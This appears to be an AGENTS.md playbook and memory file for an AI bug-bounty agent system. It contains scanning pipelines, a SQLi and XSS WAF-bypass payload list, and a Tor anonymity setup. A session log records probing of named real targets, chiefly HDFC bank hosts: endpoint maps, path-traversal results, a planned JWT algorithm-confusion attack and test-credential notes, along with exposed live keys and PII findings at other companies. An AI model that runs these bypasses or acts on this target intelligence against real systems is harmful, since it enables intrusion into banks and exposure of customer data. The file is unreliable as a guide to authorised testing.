# AGENTS.md — Self-Contained Workspace Bible

**Last updated:** 2026-07-06
**Owner:** sricharansiddu29 (REDACTED_KNOWN_SECRET)
**Purpose:** Complete portable reference. Copy this file to any device — everything you need is here.

---

# PART 1: WORKSPACE TOPOLOGY

```
~/
├── AGENTS.md                    ← THIS FILE (everything inlined)
├── session_start.sh             ← Run before every bug hunting session
├── .config/opencode/
│   ├── opencode.jsonc           ← Agent config (7 primary, 1 subagent)
│   ├── agents/                  ← Agent prompt definitions
│   │   ├── hunter.md
│   │   ├── verifier.md
│   │   ├── reporter.md
│   │   ├── plan.md
│   │   ├── debug.md
│   │   ├── recon.md
│   │   └── auditor.md
│   ├── agent_memory/
│   │   ├── hunter.md
│   │   ├── verifier.md
│   │   ├── reporter.md
│   │   ├── plan.md
│   │   └── debug.md
│   ├── common/                  ← 25 methodology files
│   ├── skills/                  ← bug-bounty, dns-recon, js-analysis
│   └── templates/
├── projects/
│   ├── projectx/                ← AI Studio (React+Vite+Express+Gemini)
│   ├── groww-trading-app/       ← NSE stock trading (Python+React)
│   ├── smart-study-assistant/   ← FastAPI+React
│   ├── training/                ← Security training
│   └── go/                      ← Go module cache
├── scripts/                     ← 45+ security automation scripts
│   ├── passive_fuzzer.sh            ← gau→uro→httpx→nuclei pipeline
│   ├── naabutonmap.py           ← Naabu→Nmap converter
│   ├── agents_launcher.sh       ← Multi-agent session launcher
│   ├── alienvault.sh            ← OTX URLs
│   ├── wayback.sh               ← Wayback URLs
│   ├── virustotal.sh            ← VT scanner (3-key rotation)
│   ├── urlscan.py               ← URLScan.io client
│   └── dorking.py               ← Google dorking
├── recon_reports/
│   ├── companies/               ← Per-company findings (groww, acko, boat, etc.)
│   ├── bugbase_reports/         ← BUGBASE_*.md
│   ├── verified_findings/       ← READY_* files from verifier
│   ├── rejected_findings/       ← Rejected with reasons
│   ├── plans/                   ← Attack plans
│   └── docs/                    ← Methodology references
├── tools/                       ← nuclei, httpx, naabu, etc.
├── notes/
├── web/                         ← Old forge/node-forge project
└── .proxyenv                    ← Tor proxy env vars
```

---

# PART 2: OPECODE AGENT SYSTEM

## opencode.jsonc Config
```json
{
  "model": "deepseek/deepseek-v4-flash-free",
  "agent": {
    "build": {"mode": "primary", "permission": {"edit": "allow", "bash": "allow"}},
    "hunter": {"mode": "primary"},
    "auditor": {"mode": "primary"},
    "recon": {"mode": "subagent"},
    "verifier": {"mode": "primary"},
    "reporter": {"mode": "primary"},
    "plan": {"mode": "primary"},
    "debug": {"mode": "primary"}
  }
}
```

## Agent Triggers
| Command | Action |
|---------|--------|
| `opencode hunt <target>` | Full Community bug bounty hunt |
| `opencode plan <target>` | Strategic attack planning + internet research |
| `opencode verify <finding>` | Zero-false-positive re-check + CVSS |
| `opencode report <finding>` | BugBase-format report generation |
| `opencode debug <issue>` | Error handler, memory manager |
| `opencode audit <codebase>` | Security code audit |
| `opencode memory <agent>` | View/update agent memory |

## Agent Memory Protocol
Each agent reads `~/.config/opencode/agent_memory/<agent>.md` at session start:
- **hunter.md** — Last sessions findings, what worked/failed, current live findings
- **verifier.md** — Verified & rejected findings per company, urgency priorities
- **reporter.md** — BugBase template constraints (120-char title, single URL)
- **plan.md** — Successful attack plans, target research
- **debug.md** — Known frustration points, cross-agent improvements

---

# PART 3: HUNTER AGENT (Full Definition)

## Role
Professional bug bounty hunter using Community methodology methodology. Precision recon, deep analysis, surgical WAF bypass.

## Core Pipeline
```
CHAOS → HTTPX → NAABU → NMAP + PARSERS → NUCLEI → FFUF
```

## CRITICAL: CDN/WAF Filtering
Check `httpx -title` output. Skip Cloudflare/Akamai/Fastly IPs. Only scan origin IPs.

## Full One-Liner Pipeline
```bash
chaos -d target.com -o subs.txt && \
httpx -l subs.txt -ip -silent | sed -nE 's/.*\[([0-9.]+)\].*/\1/p' | sort -u > ip.txt && \
httpx -l ip.txt -title -silent | grep -vi "cloudflare\|akamai\|fastly" | awk '{print $1}' > origin_ips.txt && \
naabu -l origin_ips.txt -top-ports 100 -rate 1500 -verify -silent -o naabu.txt && \
python3 ~/scripts/naabutonmap.py -i naabu.txt && \
cat ip.txt | nuclei -tags cve -bs 200 && \
cat naabu.txt | nuclei -tags cve -bs 200 && \
ffuf -w naabu.txt:URL -w ~/payloads/backup_files_only.txt:FILE -u https://URL/FILE -mc 200 -rate 50 -fs 0
```

## URL Collection Pipeline
```bash
cat subs.txt | waybackurls | uro > urls.txt
cat subs.txt | gau --subs | uro >> urls.txt
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<target>/url_list?limit=1000" | jq -r '.url_list[].url' >> urls.txt
curl -s "https://urlscan.io/api/v1/search/?q=domain:<target>" | jq -r '.results[].page.url' >> urls.txt
curl -s "https://www.virustotal.com/ui/domains/<target>/urls" | jq -r '.data[].id' >> urls.txt
```

## Continuous Probing Cycle (~45s per cycle)
1. All API endpoints — HTTP status + response analysis
2. Method bypass — PUT/PATCH/DELETE/OPTIONS/TRACE
3. SQLi — all payloads with WAF bypass variants
4. LFI — path traversal with encoding variants
5. CORS — origin reflection + credentialed + wildcard
6. SSTI — `{{7*7}}`, `#{7*7}`, `${7*7}`
7. SSRF — callback/webhook + cloud metadata
8. Config files — .env, .git, dump.sql, secrets.json, web.config (50+ paths)
9. Auth bypass — empty/null, X-Forwarded-*, X-Internal-Request
10. Actuator — all 15+ Spring Boot actuator paths
11. IDOR — sequential IDs (1, 2, 100, 1000, 5000, 9999)
12. GraphQL — introspection + query discovery
13. S3 buckets — company-name patterns on AWS
14. JS secrets — Google API keys, Stripe keys, internal endpoints
15. GF pattern classification — open redirect, LFI, SSRF params

## WAF Bypass Arsenal
```bash
# Before ANY exploitation:
wafw00f https://target.com
# Then try in order:
```

### SQLi WAF Bypass
- Case randomization: `uNiOn SeLeCt`
- Comment injection: `UN/**/ION SE/**/LECT`
- URL encoding: `%55NION %53ELECT`
- Double encoding: `%2555NION`
- Whitespace alternatives: `UNION%0ASELECT`, `UNION%09SELECT`
- Null byte: `%00` before keywords
- HPP: `?id=1&id=2' UNION SELECT 1,2,3--`
- HTTP/2 downgrade: Force HTTP/1.0
- Body padding: Add junk to exceed WAF inspection size
- Chunked encoding: Split payload across chunks
- Newline injection: `%0A` between keywords
- MySQL version comments: `/*!50000UNION*/ /*!50000SELECT*/`
- Parenthesized: `UniOn(SeLeCt(1),(2),(3))`
- Origin IP bypass: bypasses ALL WAF

### XSS WAF Bypass
- HTML entity: `&#60;script&#62;alert(1)&#60;/script&#62;`
- Unicode: `%C0%BCscript%C0%BE` (overlong UTF-8)
- Nested tags: `<svg><script>alert(1)</script></svg>`
- Obscure event handlers: `ontoggle`, `onpointerover`, `onanimationend`
- JS obfuscation: `String.fromCharCode(97,108,101,114,116,40,49,41)`
- atob: `<script>eval(atob('YWxlcnQoMSk='))</script>`
- No-paren: `` alert`1` ``
- Bidirectional overrides: Unicode bidi chars

### Vendor-Specific
| WAF | Technique |
|-----|-----------|
| Cloudflare | Obscure event handlers + heavy JS obfuscation |
| AWS WAF | Double/mixed encoding + unconventional whitespace |
| Akamai | Polyglots + SVG/animation vectors |
| ModSecurity/CRS | Case-split keywords + entity-encoded javascript: |
| F5/Imperva | HTTP/2 cleartext injection + request smuggling |

## Recon Phases

### Phase 1: Subdomain Discovery
```bash
chaos -d target.com -o subs.txt
subfinder -d target.com -all -recursive -silent >> subs.txt
assetfinder --subs-only target.com >> subs.txt
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\\n/\n/g' | sort -u >> subs.txt
```

### Phase 2: Alive Hosts + IP Dedup + CDN Filter
```bash
httpx -l subs.txt -ip -silent | sed -nE 's/.*\[([0-9.]+)\].*/\1/p' | sort -u > ip.txt
httpx -l ip.txt -title -silent | grep -vi "cloudflare\|akamai\|fastly" | awk '{print $1}' > origin_ips.txt
```

### Phase 3: Port Scanning
```bash
naabu -l origin_ips.txt -top-ports 100 -rate 1500 -verify -silent -o naabu.txt
```

### Phase 4: Service Detection + Nmap
```bash
~/scripts/naabutonmap.py -i naabu.txt
nmap-parse-output nmap-out/scan.xml html > scan.html
```

### Phase 5: Vuln Scanning
```bash
cat ip.txt | nuclei -tags cve -bs 200
cat naabu.txt | nuclei -tags cve -bs 200
```

### Phase 6: Fuzzing
```bash
ffuf -w naabu.txt:URL -w payloads/backup_files_only.txt:FILE -u https://URL/FILE -mc 200 -rate 50 -fs 0
```

### URL Analysis
```bash
cat urls.txt | uro | grep -E '\?[^=]+=.+$' > params.txt
gf xss params.txt | httpx -silent | nuclei -tags xss
gf sqli params.txt | httpx -silent | nuclei -tags sqli
gf ssrf params.txt | httpx -silent | nuclei -tags ssrf
gf redirect params.txt | httpx -silent | nuclei -tags redirect
```

## Save Findings
Every finding → `~/recon_reports/companies/<program>/unreported/` with:
- Title, severity, timestamp, HASH
- Tag `_UNVERIFIED=true`
- Full request/response data

## Pro-Tips
1. CDN filtering is MANDATORY
2. Non-standard ports matter — use naabu.txt in nuclei + ffuf
3. 403 is gold — always try bypass techniques
4. Response size/word count analysis — 200 OK can be custom error
5. Parse nmap output — XML is unreadable, convert to HTML
6. IP dedup before scanning — sort -u first

---

# PART 4: HUNTER AGENT MEMORY

## Mistake: 2026-07-05 — Anonymity Stack Deployment Crashed Internet
- **Error**: Deployed anonymity stack without verification. Tor config had deprecated options (NumEntryGuards, NumDirectoryGuards, DNSListenAddress). iptables OUTPUT policy set to DROP but never verified. UFW allowed port 443 for Tor bootstrap but defeated kill switch.
- **Fix**:
  1. Always `tor --verify-config` BEFORE restarting Tor
  2. Always verify iptables with `iptables -L | head -5`
  3. Never use `ufw allow out to any port 443` — use `-m owner --uid-owner debian-tor`
  4. Deploy kill switch LAST after confirming Tor proxy works
- **Prevention Checklist**:
  1. `tor --verify-config`
  2. `ss -tlnp | grep 9050`
  3. `proxychains4 curl https://check.torproject.org/`
  4. `iptables -L OUTPUT | head -1`
  5. Test direct blocked AFTER confirming Tor works
  6. Keep root shell with `sudo ufw disable` as emergency rollback
  7. Never `ufw allow out to any port 443`

## Infrastructure Deployment Safety Reference
```
STEP 1: CONFIGURE (firewall OFF)
  ├── Write torrc with valid options only
  ├── RUN: tor --verify-config  ← MUST pass
  └── RUN: sudo systemctl restart tor@default

STEP 2: VERIFY TOR ALONE
  ├── RUN: ss -tlnp | grep 9050
  ├── RUN: proxychains4 curl https://check.torproject.org/
  └── RUN: proxychains4 curl https://httpbin.org/ip

STEP 3: CONFIGURE FIREWALL (only after Tor verified working)
  ├── Use iptables with -m owner --uid-owner $(id -u debian-tor)
  ├── NEVER `ufw allow out to any port 443`
  └── VERIFY: sudo iptables -L OUTPUT | head -1

STEP 4: TEST KILL SWITCH
  ├── RUN: curl -s --max-time 3 https://httpbin.org/ip (FAIL)
  └── RUN: proxychains4 curl -s https://httpbin.org/ip (WORK)

STEP 5: EMERGENCY ROLLBACK
  ├── sudo systemctl reset-failed tor@default
  ├── sudo ufw disable
  └── sudo iptables -P OUTPUT ACCEPT
```

### Config Validation Rules
| What | Command |
|------|---------|
| Validate Tor config | `tor --verify-config` |
| Check Tor listening | `ss -tlnp \| grep 9050` |
| Check Tor routing | `proxychains4 curl https://check.torproject.org/` |
| Check iptables policy | `iptables -L OUTPUT \| head -1` |
| Emergency disable | `sudo ufw disable && sudo iptables -P OUTPUT ACCEPT` |
| Tor user UID | `id -u debian-tor` |

### Options that CRASH Tor 0.4.5.x
```
NumEntryGuards         ← DEPRECATED - crashes
NumDirectoryGuards     ← DEPRECATED - crashes
DNSListenAddress       ← WRONG SYNTAX - use DNSPort 127.0.0.1:5353
ExcludeSingleHopRelays ← OBSOLETE
CircuitStreamTimeout   ← Only in newer Tor
```

## Current Session: 2026-07-06 (HDFC Phase 2 Recon)

### In-Scope Assets (HDFC BugBase - Private)
1. **Netbanking Rewrite**: `https://nb-nextgen-security.hdfcbank.com/retail-app/` (returns 301)
2. **Lastmile Web**: `https://lastmilewebuat.hdfcuat.bank.in/IndiaLinkWeb/` (Indialink 2.0 login)
3. **CBX Web**: `https://cbxuat.hdfcbank.com:444/cbx/` → redirects to `https://cbxuat.hdfcuat.bank.in:444/cbx/`
4. SME Web (VPN needed)
5. CorpCards (VPN needed)
6. ENET CorpSSL (VPN needed)
7. BizExpress (VPN needed)
8. CLO (VPN needed)

### Technology Stack
| Target | Tech | WAF | Notes |
|--------|------|-----|-------|
| Netbanking Rewrite | nginx/Keycloak | F5 BIG-IP ASM | `/retail-app` 301; CSP default-src 'self'; Keycloak realm `retail` |
| Lastmile Web (Indialink 2.0) | Oracle WebLogic | F5 BIG-IP | X-ORACLE-DMS-ECID; AES-GCM client encryption |
| CBX Corporate Netbanking | Oracle WebLogic + OTL | F5 BIG-IP + Netscaler + custom OTL | Anti-tamper JS v1.21.4.26; `NSC_ESNS` cookie (15s) |
| ENET | IBM HTTP Server 8.5.5 + Struts2/Java | F5 BIG-IP Volterra | `x-volterra-location: mb2-mum`; IBM HTTP Server 8.5.5 CONFIRMED |

### Key Discovery Paths

#### CBX (Corporate Netbanking)
- **OTL Anti-Tamper Bypass**: `fetch` API bypasses OTL completely (XHR only)
- **OTL Whitelisted Endpoints** (no tamper wrapping): `forgotpassword`, `postlogingeneratesalt`, `transactionCode`
- **Potential Path Traversal**: `/cbx/..%252f` returns 500 (double-encoded)
- **CSP connect-src allows localhost SSRF**: `https://localhost:9999`, `https://localhost:19999`, `https://localhost:29999`
- **Error Codes**: -1513 (suspended), -1514 (blocked), -1504 (inactive), -1501 (OTP blocked), -1502 (incorrect OTP)
- **Login**: `/cbx/CBXLogin.jsp` → `/cbx/iportal/jsps/errorPage/genericErrorPage.jsp` (requires proper session)
- **Paths found**: `/cbx/iportal` (302), `/cbx/IbsJsps` (302), `/EntlWeb/js/common/common.js`, `/EntlWeb/orbi-one/style.css`

#### Indialink 2.0 (Lastmile Web)
- **Login**: `/IndiaLinkWeb/onlinetransfer/secure/login.jsp`
- **Login Action**: `/IndiaLinkWeb/onlinetransfer/secure/LoginAction.jsp` (POST redirects to login.jsp on failure)
- **Form Fields**: `entityId`, `userId`, `password`, `passwordENC` (encrypted), `captchaEntered`, `formid` (-1139150440), `groupId` (RGEX)
- **Client-Side Encryption**: AES-GCM with forge library; 8-byte random key+IV; static additionalData 'LM'; format: key+iv+tag(b64)+encrypted(b64)
- **CAPTCHA**: `/IndiaLinkWeb/CaptchaLoader` (PNG 150×50)
- **Forgot Password**: `/IndiaLinkWeb/onlinetransfer/secure/admin/corporateForgetPassword.jsp`
- **JS Files**: `aes.js`, `AesUtil.js`, `commonValidation.js`, `rgRequestEncoder.js`, `custom.js`, `customIndex.js`, `virtualKeyboard.js`, `forge.min.js`, `app.secure.js`
- **Pattern**: All URLs use version query param `?v=1783064730387`

### Saved Findings
- `~/recon_reports/companies/hdfc/unreported/CBX_OTL_Bypass_fetch_API_*.md`
- `~/recon_reports/companies/hdfc/unreported/CBX_OTL_Deep_Analysis_*.md`
- `~/recon_reports/companies/hdfc/unreported/CBX_Path_Traversal_500_*.md`
- `~/recon_reports/companies/hdfc/unreported/CSP_SSRF_CBX_*.md`
- `~/recon_reports/companies/hdfc/unreported/Indialink_Client_Side_Encryption_*.md`
- `~/recon_reports/companies/hdfc/unreported/Tech_CBX_BigIP_*.md`
- `~/recon_reports/companies/hdfc/unreported/Tech_Netbanking_Rewrite_*.md`

### Netbanking Rewrite (Backbase Angular SPA)
**Client ID:** bb-web-client (public, PKCE-required)
**Keycloak Realm:** retail `https://nb-nextgen-security.hdfcbank.com/auth/realms/retail/`
**OIDC Config:** `/.well-known/openid-configuration`
**JWKS URI:** `/protocol/openid-connect/certs`
**API Gateway:** `api-nb-nextgen-security.hdfcbank.com` (internal - returns 000)
**Backend:** `retail-web-nb-nextgen-security.hbctxdom.com`
**API Proxy:** `/retail-app/gateway`, `/retail-app/api` (return SPA, not raw API)
**CSP connect-src:** `api-nb-nextgen-security.hdfcbank.com` + `retail-web-nb-nextgen-security.hbctxdom.com`
**Auth Required:** PKCE S256 code_challenge_method; `password` grant not allowed for `bb-web-client`

### 168 API Endpoints Found in main.js (2.6MB)
| Category | Key Endpoints |
|----------|--------------|
| **Cards** | `/debit-cards/blockcard`, `increaseLimit`, `reissue-debit-card`, `request-pin/green-pin`, `request-pin/instant-pin`, `request-pin/physical-pin`, `fetch-limits`, `redeem-rewards`, `upgrade-debit-card`, `dcemi/`, `inquire-pin-options`, `inquire-rewards`, `link/accounts`, `transaction-consent-form` |
| **Payments** | `/contacts/payee/add/isAllowed`, `/contacts/payee/delete`, `/contacts/payee/update`, `/contacts/payee/validateAccount`, `/contacts/payee/validate/international`, `/contacts/payee/validatePayeeName`, `/contacts/payee/beneNpciLookup`, `/contacts/payee/otherBankIdentifiers`, `/contacts/payee/custom/limit`, `/contacts/transfer` |
| **Accounts** | `/account/`, `/arrangements/primary-account`, `/arrangements/casa/refresh`, `/arrangements/epa/arrangements`, `/arrangements/mmid/`, `/external-accounts`, `/account/statements/download` |
| **Deposits** | `/deposits/`, `/loans`, `/interest-certificates/configuration` |
| **Config** | `/configuration/genericparams/`, `/configuration/masking-patterns`, `/configuration/countries`, `/configuration/nominee-relations`, `/configuration/error-details/batch/retrieval` |
| **Security** | `/biocatch/bind`, `/user-masked-profile`, `/user-masked-profile-ext`, `/error-messages/mfa`, `/e2e-nb-jwk` |
| **Admin** | `/accessgroups/users/permissions/summary`, `/accessgroups/users/user-privileges`, `/kavach/cs-user-status`, `/setup/features`, `/config/features` |
| **Services** | `dis-configuration-service`, `dis-encrypt-decrypt-service`, `dis-login-service`, `dis-mfa-auth-service` |
| **Statements** | `/account/statements`, `/account/statements/archive`, `/account/statements/categories`, `/account/statements/preferences` |

### ENET (Corporate Banking - Struts/Java + IBM HTTP Server 8.5.5)
- **URLs:** `https://hbenetinterap.hdfcuat.bank.in/EnetSSL/` + `/EnetMVC/`
- **Web Server:** IBM HTTP Server 8.5.5 (End of Support Sep 2020, based on Apache 2.4.x)
- **App Server:** Struts2/Java with Dynamic Method Invocation (dynamethod parameter)
- **Login action:** `core.login.autopwdldngpag.do` (Struts)
- **Form fields:** userId, password, encryptpassword, authrandom, salt, hash1, hash2, captcha, groupId
- **JS:** md5.js, SHA512.js, slnn_sec.js, QlCBSCommonVal.js, AppCommonVal.js
- **CSP:** `default-src 'self' 'unsafe-inline' 'unsafe-eval'` (very permissive)
- **Internal IP leak:** `REDACTED_KNOWN_SECRET:443` in CORS policy (+ credentialed=true)
- **Same localhost SSRF:** connect-src localhost:9999/19999/29999
- **Paths:** `/EnetSSL/login.do` (200), `/EnetSSL/jsp/CommonJsp/Session.jsp` (500), `/EnetSSL/jsp/CommonJsp/logon.jsp` (200), `/EnetSSL/jsp/CommonJsp/ForgotPwdDetails.jsp` (200), `/EnetSSL/captcha.png` (200), `/EnetMVC/` (200), `/EnetMVC/core.login.autopwdldngpag.do` (200)
- **Apache paths:** `/server-status` (403 = EXISTS!), `/icons/` (403), `/cgi-bin/` (403)
- **hashrand:** Dynamic (changes per request), not hardcoded as previously thought
- **OTP:** Any 6-digit for UAT
- **Forgot Password:** 4 Struts DMI endpoints exposed publicly:
  - `core.forgetpwd.showoptions.do?dynamethod=showPwdReqOptions`
  - `core.forgetpwd.showoptions.do?dynamethod=checkPrevReq` (returns "0" for no prior requests)
  - `core.forgetpwd.forgetpwdmig.do?dynamethod=getcbxdomstatus` (returns `{"domainStatus":""}`)
  - `core.forgetpwd.forgetpwdmig.do?dynamethod=showPwdReqOptions`
- **Domain 'HDFCBANK' explicitly blocked** in forgot password (others accepted)

### SME CLO UAT
- **URL:** `https://smeclouat.hdfcbank.com/clouat9/cloportal/#/rm-journey`
- **Status:** 503 (no healthy upstream - service down)
- **CSP bypass:** `connect-src 'self' blob: *` (wildcard!)
- **Custom methods:** RDSERVICE, DEVICEINFO, CAPTURE
- **Partners:** Perfios (demo03.perfios.com), Anumati (uat-web.anumati.co.in)

### Latest Session (2026-07-06) - New Critical Discoveries

#### ENET Struts2 Path Traversal (CONFIRMED)
- **`/EnetMVC/../` returns 200** - IBM HTTP Server 8.5.5 welcome page (3598 bytes)
- Traversal depth unlimited: `../../../` all work (return same welcome page)
- Can access: index.html, css, images, other webapps via traversal
- **Cannot access**: system files (/etc/passwd → 404), WEB-INF (404), conf/ (404)
- `.htaccess` at root returns 403 (confirmed present)

#### CBX Double-Encoded Path Traversal
- `..%252f` → **500** (server processes double-decode but errors)
- `..%252f/WEB-INF/web.xml` → **000 timeout** (server hangs at 10s)
- `..%252f/META-INF/MANIFEST.MF` → **000 timeout** (server hangs)
- Pattern: directory traversal = 500 fast fail, file traversal = 000 timeout (crash/hang)

#### Netbanking Keycloak OIDC Deep Analysis
- All grant types supported INCLUDING password grant (though `bb-web-client` blocks it)
- **JWT algorithm confusion risk**: HS256/HS384/HS512 listed alongside RS256/RS384/RS512
- **Userinfo supports "none" algorithm** - potential forgery
- **Token introspection**: 403 "Client not allowed" for bb-web-client
- **Token revocation**: HTTP 200 (works for any client_id)
- **Device grant**: Disabled for bb-web-client
- **PAR (Pushed Authorization Requests)**: 401 - requires auth
- Only 1 confirmed client: `bb-web-client` (public, PKCE S256)
- Single JWKS RSA key: kid=`REDACTED_KNOWN_SECRET`

### Next Steps
1. ✅ **ENET path traversal exploited** - saved finding
2. ✅ **CBX double-encoded traversal tested** - saved finding
3. ✅ **IBM HTTP Server 8.5.5 confirmed** via welcome page
4. ✅ **ENET ForgotPassword analyzed** - 4 Struts DMI endpoints found
5. ✅ **Keycloak OIDC deep analysis** - JWT alg confusion, password grant supported
6. ⬜ **Mobile APKs** from BugBase: download and decompile for secrets
7. ⬜ **JWT algorithm confusion PoC** - try HS256 with JWKS public key
8. ⬜ **SME CLO recheck** when service recovers
9. ⬜ **Collect HDFC trajectories** → retrain SkillOpt for v2

### HDFC Test Credentials (Static on UAT)
- Cust ID: **REDACTED_KNOWN_SECRET** / Password: **REDACTED_KNOWN_SECRET** (Netbanking Rewrite)
- OTP: 123456 (BizExpress/Netbanking Rewrite), any 6-digit (Lastmile/CLO)
- PAN: ABCDE1234F (CLO)

### Saved Findings (28 files - updated 2026-07-06)
`~/recon_reports/companies/hdfc/unreported/`:

#### New This Session (2026-07-06):
- `ENET_Struts2_Path_Traversal_IHS_Disclosure_*.md` — Path traversal via `/EnetMVC/../` + IHS 8.5.5 confirmed
- `ENET_Public_ForgotPassword_Struts_DMI_*.md` — Forgot password page + 4 Struts DMI endpoints exposed
- `CBX_Double_Encoded_Path_Traversal_*.md` — Double-encoded traversal (500 for dirs, 000 timeout for files)
- `Netbanking_Keycloak_OIDC_Deep_Analysis_*.md` — Full Keycloak config analysis, JWT alg confusion risk

#### Previous Sessions:
- `Netbanking_API_Endpoints_*.md` — 168 API endpoints
- `Netbanking_Keycloak_Config_Exposed_*.md` — OIDC config leak
- `ENET_Internal_IP_Leak_CORS_*.md` — REDACTED_KNOWN_SECRET leak
- `ENET_Login_Hash_Reverse_Engineered_*.md` — Full hash computation (dated - hashrand is dynamic)
- `ENET_Struts2_Dynamic_Methods_*.md` — Struts DMI endpoints discovered
- `ENET_Captcha_SQLi_Error_Analysis_*.md` — Captcha bypass attempts
- `ENET_Hardcoded_Hashrand_*.md` — (superseded - hashrand is dynamic per request)
- `ENET_Login_Flow_Analysis_*.md` — Login flow mapping
- `CBX_OTL_Bypass_fetch_API_*.md` — fetch bypasses OTL
- `CBX_OTL_Deep_Analysis_*.md` — Full OTL JS analysis v1.21.4.26
- `CBX_Path_Traversal_500_*.md` — Initial ..%252f finding
- `CBX_iportal_Accessible_Assets_*.md` — Static asset enumeration
- `CBX_Deep_Traversal_Analysis_*.md` — Traversal behavior mapping
- `CSP_SSRF_CBX_*.md` — localhost SSRF vector
- `CVE-2026-21962_WebLogic_Testing_*.md` — WebLogic proxy RCE test
- `Indialink_Client_Side_Encryption_*.md` — AES-GCM analysis
- `Tech_CBX_BigIP_*.md`, `Tech_Netbanking_Rewrite_*.md` — Tech fingerprints
- `Netbanking_Rewrite_Actuator_Analysis_*.md` — Actuator fake SPA handler
- `Captcha_Bypass_and_Login_Attempts_*.md` — Login attempt results

## Last Session: 2026-07-05 (Exploitation Session)

### What Worked
1. Mendix XAS get_session_data: Extracted full app metadata including 15+ constants
2. Razorpay Live Key Discovery: Found `REDACTED_RAZORPAY_LIVE_KEY` in D2D.RKey constant
3. Apache on 443 (no TLS): Confirmed test.boat-lifestyle.com serves HTTP on HTTPS port
4. Laravel Nova Detection: Found Nova admin panel on crewx.boat-lifestyle.com
5. mix-manifest.json: Full Laravel asset map (186KB) publicly accessible
6. SOAP Endpoints: Confirmed /ws/ handler active on Mendix
7. 4 new BugBase reports written: 005 (CRITICAL), 006 (HIGH), 007 (MEDIUM), 008 (MEDIUM)

### What Failed
1. Mendix Anonymous role cannot execute microflows or read entities
2. Crewex admin 403: ALL bypass techniques failed
3. Crewex login: 419 CSRF timeout (cookie/token mismatch)
4. Razorpay API: key_secret not found (only key_id)
5. S3 buckets: boat-files fully locked down
6. Mendix SOAP: All 30+ guessed service names returned "Unknown service"

### Current Live Findings (boat-lifestyle.com)
1. S3 PII Leak (CRITICAL, CVSS 9.6) - 83 PDFs exposed
2. Razorpay Live Key Exposure (CRITICAL, CVSS 9.1)
3. Apache no TLS test.boat-lifestyle.com (HIGH, CVSS 7.5)
4. Warranty Test PDFs (HIGH)
5. Mendix Constants Exposure (MEDIUM)
6. Crewex Admin API (MEDIUM)
7. Mendix SOAP/REST (MEDIUM)
8. OTP Rate Limit (MEDIUM)
9. GraphQL Introspection (MEDIUM)

### Key Assets
- Razorpay: `REDACTED_RAZORPAY_LIVE_KEY` (needs key_secret)
- Crewex CSRF: `REDACTED_KNOWN_SECRET`
- Mendix Session: `REDACTED_SESSION_ID`
- Crewex Apache: 2.4.52 Ubuntu

---

# PART 5: VERIFIER AGENT (Full Definition)

## Role
Zero-false-position vulnerability verifier. Quality gate. If you cant reproduce it confidently, REJECT IT.

## Verification Protocol

### Step 1: Scope & Policy Check
- Read SCOPE_POLICY.md
- Confirm endpoint IN SCOPE
- Confirm testing does NOT violate program rules

### Step 2: Baseline Capture
```bash
curl -s -o /dev/null -w "%{http_code}" "https://target.com/endpoint?param=innocent"
curl -s "https://target.com/endpoint?param=innocent" > baseline.txt
```

### Step 3: PoC Re-Request
```bash
curl -s -o /dev/null -w "%{http_code}" "https://target.com/endpoint?param=MALICIOUS_PAYLOAD"
curl -s "https://target.com/endpoint?param=MALICIOUS_PAYLOAD" > exploit_response.txt
```

### Step 4: Response Diff Analysis
- Status code change?
- Response length change?
- Content-Type change?
- Body content contains indicator?

### Step 5: Reproducibility (3-request rule)
```bash
for i in 1 2 3; do
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/endpoint?param=PAYLOAD"
  sleep 0.5
done
```
Must reproduce 2/3. If not → REJECT as transient.

### Step 6: Vuln-Specific Confirmation

| Vuln Type | Confirm via | False Positive Signs |
|-----------|-------------|---------------------|
| SQLi | Error has SQL syntax / information_schema / delayed | Generic "An error occurred" |
| XSS | Playwright executes JS | `<` becomes `&lt;` |
| Reflected XSS | Payload unescaped + browser executes | `<` becomes `&lt;` |
| DOM XSS | Playwright confirms alert fires | Regex check cant confirm DOM |
| SSRF | Callback received OR internal data in response | Payload echoed back |
| LFI | /etc/passwd visible | Only error message |
| SSTI | `{{7*7}}` returns "49" | Raw string `{{7*7}}` |
| CORS | ACA-Origin echoes custom origin | Wildcard or no ACA headers |
| Auth Bypass | Protected data returned without valid auth | Same as unauthed response |
| IDOR | Different users data returned by changing ID | Same data regardless of ID |
| Config Leak | Contains actual secrets (not just file header) | File empty or template |
| Open Redirect | Browser redirects to external URL | Returns 200 with link no redirect |
| GraphQL | Schema returned with type definitions | Only `{"errors"}` or empty |

### Step 7: Browser Validation (XSS)
```bash
# Use Playwright to confirm actual JS execution
# If alert fires → confirmed
```

### Step 8: False Positive Signature Check
Dismiss if:
- Payload only in error message (not page context)
- Payload is HTML-escaped
- Server returned 403/400/WAF block
- Endpoint is test/sandbox not production
- Content-Type changed (HTML→JSON = error handling)
- Same data regardless of payload (parameter ignored)

### Step 9: CVSS Scoring (CVSS 3.1)
- **Critical (9.0-10.0)**: RCE, SQLi extraction, auth bypass admin, SSTI, LFI sensitive files
- **High (7.0-8.9)**: SSRF, CORS+credentials, IDOR PII, actuator /env
- **Medium (4.0-6.9)**: CORS wildcard, open redirect, actuator info
- **Low (1.0-3.9)**: Stack traces, missing headers
- **Informational (0.0)**: Subdomains, open ports

### Step 10: Decision
| Confidence | Verdict | Action |
|-----------|---------|--------|
| >= 80% | VERIFIED | Move to `~/recon_reports/verified_findings/READY_*` |
| 50-79% | PARTIAL | "Needs manual review" |
| < 50% | REJECTED | Move with reason |

VERIFIED must include: severity, confidence, reproducibility count, CVSS vector string, full PoC, CWE reference.

---

# PART 6: VERIFIER AGENT MEMORY

## Verified Findings (Still Active)

### Groww — STILL CRITICAL
| Finding | Severity | CVSS | Status |
|---------|----------|------|--------|
| GitHub Credential Leak — [REDACTED]/groww/.env.example (JWT, TOTP, PUSH_TOKEN) | CRITICAL | 9.8 | ✅ STILL LIVE |
| SOP Document Exposure — 496KB internal PDF | MEDIUM | 5.3 | ✅ STILL LIVE |
| BugBase Config Leak — __NEXT_DATA__ exposes program config | MEDIUM | 5.3 | ✅ Confirmed |

### Mygate — Still Verified
| Finding | Severity | CVSS | Status |
|---------|----------|------|--------|
| Internal IP Leak — REDACTED_KNOWN_SECRET:8888 in JS bundle | HIGH | 7.5 | ✅ STILL LIVE |

### Acko — Still Verified
| Finding | Severity | Status |
|---------|----------|--------|
| S3 Pre-signed URL Generation — acko-partners-restricted | CRITICAL | ✅ STILL LIVE |
